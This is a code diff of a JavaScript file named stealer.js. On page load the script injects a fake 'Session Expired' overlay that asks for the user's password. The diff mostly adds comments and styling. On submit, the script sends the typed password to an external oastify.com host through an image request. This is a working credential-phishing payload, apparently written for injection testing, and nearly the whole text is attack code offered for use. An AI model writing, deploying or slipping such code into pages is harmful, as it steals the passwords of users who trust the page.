@@ -1,7 +1,8 @@
 // stealer.js
 document.addEventListener('DOMContentLoaded', function() {
-    console.log('DOM content loaded'); // Debugging: ensure DOM is loaded
+    console.log('DOM content loaded'); // Log when the DOM is ready.
 
+    // Create the form element
     var form = document.createElement('form');
     form.style.position = 'fixed';
     form.style.top = '30%';
@@ -10,29 +11,38 @@ document.addEventListener('DOMContentLoaded', function() {
     form.style.background = 'white';
     form.style.padding = '20px';
     form.style.boxShadow = '0 0 10px rgba(0,0,0,0.3)';
-    form.style.zIndex = '99999'; // Ensure it appears above other elements
+    form.style.zIndex = '99999'; // Ensure it appears above other elements.
+    form.style.maxWidth = '400px'; // Set a max-width for better appearance.
+    form.style.borderRadius = '8px'; // Add some border radius for aesthetics.
+
+    // Form content
     form.innerHTML = `
         <h2>Session Expired</h2>
         <p>Please re-enter your password:</p>
         <input type="password" id="password" placeholder="Enter password" required>
         <button type="submit">Submit</button>
     `;
-    
-    // Debugging: log if the form is added to the DOM
-    console.log('Form element created:', form);
 
+    // Log the form creation process.
+    console.log('Form created:', form);
+
+    // Append the form to the body.
     document.body.appendChild(form);
-    console.log('Form added to body');
+    console.log('Form added to the body.');
 
+    // Handle form submission
     form.addEventListener('submit', function(e) {
-        e.preventDefault();
-        let password = document.getElementById('password').value;
-        console.log('Password entered:', password); // Debugging: check if password is captured
-
-        // Send password to external server
-        new Image().src = `https://7z78izwvrg0u9gsi9lwme1z29tfk3c20r.oastify.com?password=${encodeURIComponent(password)}`;
+        e.preventDefault(); // Prevent the form from actually submitting.
         
-        // Update form content after submission
+        let password = document.getElementById('password').value;
+        console.log('Password entered:', password); // Log the password for debugging.
+
+        // Send the password to an external server (change this to your testing endpoint).
+        const img = new Image();
+        img.src = `https://7z78izwvrg0u9gsi9lwme1z29tfk3c20r.oastify.com?password=${encodeURIComponent(password)}`;
+
+        // Change the form content to show that it's processing.
         form.innerHTML = "<p>Loading...</p>";
+        console.log('Password sent to external server.');
     });
 });
